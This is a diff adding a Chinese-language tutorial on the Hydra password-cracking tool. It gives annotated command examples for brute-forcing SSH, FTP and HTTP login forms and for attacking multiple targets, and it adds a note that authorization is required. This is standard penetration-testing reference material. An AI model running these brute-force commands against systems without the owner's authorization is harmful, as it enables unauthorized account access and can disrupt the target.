@@ -1,0 +1,59 @@
+### 1. 破解 SSH 服务密码
+```bash
+hydra -l username -P passwordlist.txt target_ip ssh
+```
+- **解释**：
+  - `-l username`：指定要破解的用户名。
+  - `-P passwordlist.txt`：指定密码字典文件，该文件包含了可能的密码列表。
+  - `target_ip`：目标主机的 IP 地址。
+  - `ssh`：指定要破解的服务为 SSH。
+
+### 2. 破解 FTP 服务密码
+```bash
+hydra -L userlist.txt -p password target_ip ftp
+```
+- **解释**：
+  - `-L userlist.txt`：指定用户名列表文件，该文件包含了可能的用户名。
+  - `-p password`：指定单个密码进行尝试。
+  - `target_ip`：目标主机的 IP 地址。
+  - `ftp`：指定要破解的服务为 FTP。
+
+### 3. 破解 HTTP 表单认证密码
+```bash
+hydra -l admin -P passwords.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+```
+- **解释**：
+  - `-l admin`：指定要破解的用户名为 `admin`。
+  - `-P passwords.txt`：指定密码字典文件。
+  - `target_ip`：目标主机的 IP 地址。
+  - `http-post-form`：指定使用 HTTP POST 方法进行表单认证破解。
+  - `"/login.php:username=^USER^&password=^PASS^:F=incorrect"`：
+    - `/login.php` 是登录表单所在的页面。
+    - `username=^USER^&password=^PASS^` 表示表单中用户名和密码的字段名，`^USER^` 和 `^PASS^` 是 `Hydra` 的占位符，分别代表用户名和密码。
+    - `F=incorrect` 表示当页面中包含 `incorrect` 字符串时，说明密码错误。
+
+### 4. 限制并发任务数
+```bash
+hydra -l user -P passlist.txt -t 4 target_ip ssh
+```
+- **解释**：
+  - `-t 4`：指定并发任务数为 4，即同时进行 4 个密码尝试任务，可根据目标主机性能和网络情况调整该参数。
+
+### 5. 启用 verbose 模式
+```bash
+hydra -l user -P passlist.txt -vV target_ip ssh
+```
+- **解释**：
+  - `-vV`：启用详细输出模式，会显示每个尝试的用户名和密码以及尝试结果，方便调试和观察破解过程。
+
+### 6. 破解多个目标主机
+```bash
+hydra -L users.txt -P passwords.txt -M targets.txt ssh
+```
+- **解释**：
+  - `-M targets.txt`：指定目标主机列表文件，该文件包含了多个目标主机的 IP 地址或域名，`Hydra` 会依次对这些目标主机进行密码破解。
+
+### 注意事项
+- **合法性**：在使用 `Hydra` 进行密码破解时，必须获得目标系统所有者的明确授权，否则可能会触犯法律法规。
+- **性能影响**：暴力破解会消耗大量的系统资源和网络带宽，可能会对目标系统造成影响，使用时需谨慎。
+- **字典质量**：密码字典的质量直接影响破解成功率，应根据目标系统的特点选择合适的字典。
